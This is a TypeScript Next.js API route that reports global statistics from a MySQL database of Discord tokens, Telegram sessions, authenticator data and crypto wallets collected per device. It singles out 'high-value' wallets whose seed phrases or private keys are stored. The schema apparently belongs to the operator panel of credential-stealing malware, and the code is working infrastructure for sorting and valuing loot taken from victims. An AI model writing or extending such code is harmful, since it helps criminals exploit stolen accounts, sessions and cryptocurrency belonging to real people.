import { NextRequest, NextResponse } from "next/server"
import { executeQuery } from "@/lib/mysql"
import { RowDataPacket } from "mysql2"

/**
 * GET /api/v1/messaging/stats/global
 * Get global statistics for all messaging & wallet data across all devices
 */
export async function GET(request: NextRequest) {
  try {
    // Get counts for each category
    const [discordCount, telegramCount, authCount, walletCount, deviceCount] = await Promise.all(
      [
        executeQuery("SELECT COUNT(*) as count FROM discord_tokens") as Promise<RowDataPacket[]>,
        executeQuery("SELECT COUNT(*) as count FROM telegram_sessions") as Promise<
          RowDataPacket[]
        >,
        executeQuery("SELECT COUNT(*) as count FROM authenticator_data") as Promise<
          RowDataPacket[]
        >,
        executeQuery("SELECT COUNT(*) as count FROM crypto_wallets") as Promise<RowDataPacket[]>,
        executeQuery("SELECT COUNT(DISTINCT device_id) as count FROM devices") as Promise<
          RowDataPacket[]
        >,
      ],
    )

    // Get counts by token type for Discord
    const discordByType = (await executeQuery(
      "SELECT token_type, COUNT(*) as count FROM discord_tokens GROUP BY token_type",
    )) as RowDataPacket[]

    // Get counts by session type for Telegram
    const telegramByType = (await executeQuery(
      "SELECT session_type, COUNT(*) as count FROM telegram_sessions GROUP BY session_type",
    )) as RowDataPacket[]

    // Get counts by wallet type
    const walletsByType = (await executeQuery(
      "SELECT wallet_type, COUNT(*) as count FROM crypto_wallets GROUP BY wallet_type",
    )) as RowDataPacket[]

    // Get counts by blockchain
    const walletsByBlockchain = (await executeQuery(
      "SELECT blockchain, COUNT(*) as count FROM crypto_wallets WHERE blockchain IS NOT NULL GROUP BY blockchain",
    )) as RowDataPacket[]

    // Get high-value wallet counts
    const highValueWallets = (await executeQuery(
      "SELECT COUNT(*) as count FROM crypto_wallets WHERE seed_phrase IS NOT NULL OR private_key IS NOT NULL",
    )) as RowDataPacket[]

    // Get devices with messaging/wallet data
    const devicesWithData = (await executeQuery(`
      SELECT DISTINCT device_id
      FROM (
        SELECT device_id FROM discord_tokens
        UNION
        SELECT device_id FROM telegram_sessions
        UNION
        SELECT device_id FROM authenticator_data
        UNION
        SELECT device_id FROM crypto_wallets
      ) as all_devices
    `)) as RowDataPacket[]

    const total =
      (discordCount[0]?.count || 0) +
      (telegramCount[0]?.count || 0) +
      (authCount[0]?.count || 0) +
      (walletCount[0]?.count || 0)

    return NextResponse.json({
      success: true,
      total_items: total,
      total_devices: deviceCount[0]?.count || 0,
      devices_with_messaging_wallet_data: devicesWithData.length,
      counts: {
        discord_tokens: discordCount[0]?.count || 0,
        telegram_sessions: telegramCount[0]?.count || 0,
        authenticator_data: authCount[0]?.count || 0,
        crypto_wallets: walletCount[0]?.count || 0,
        high_value_wallets: highValueWallets[0]?.count || 0,
      },
      breakdown: {
        discord_by_type: discordByType.reduce((acc, row) => {
          acc[row.token_type] = row.count
          return acc
        }, {} as Record<string, number>),
        telegram_by_type: telegramByType.reduce((acc, row) => {
          acc[row.session_type] = row.count
          return acc
        }, {} as Record<string, number>),
        wallets_by_type: walletsByType.reduce((acc, row) => {
          acc[row.wallet_type] = row.count
          return acc
        }, {} as Record<string, number>),
        wallets_by_blockchain: walletsByBlockchain.reduce((acc, row) => {
          acc[row.blockchain] = row.count
          return acc
        }, {} as Record<string, number>),
      },
    })
  } catch (error) {
    console.error("Error fetching global messaging/wallet stats:", error)
    return NextResponse.json(
      { error: "Failed to fetch global statistics" },
      { status: 500 },
    )
  }
}
